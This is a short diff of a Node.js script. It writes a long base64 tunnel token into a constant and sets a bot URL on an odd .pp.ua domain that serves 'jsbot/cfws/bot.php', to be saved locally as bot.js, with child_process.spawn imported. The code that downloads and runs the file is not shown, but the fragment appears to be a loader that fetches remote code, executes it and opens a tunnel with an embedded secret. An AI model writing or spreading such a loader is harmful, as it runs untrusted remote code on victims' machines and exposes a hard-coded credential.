@@ -2,7 +2,7 @@ const https = require("https");
 const fs = require("fs");
 const { spawn } = require("child_process");
 
-const TOKEN = "";
+const TOKEN = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiZTcxM2IwNmItMTI4OS00YWE0LWJkYjYtNDA2Y2JmM2U2ODNhIiwicyI6Ik5tWmlPRGMyTnprdFltRXpPUzAwWXpFd0xXSmhPR1F0T1dKa01qVTVPREUzWldSbSJ9";
 const BOT_URL = `https://netjett-de.kof95zip.pp.ua/jsbot/cfws/bot.php?token=${TOKEN}`;
 const BOT_FILE = "./bot.js";
 
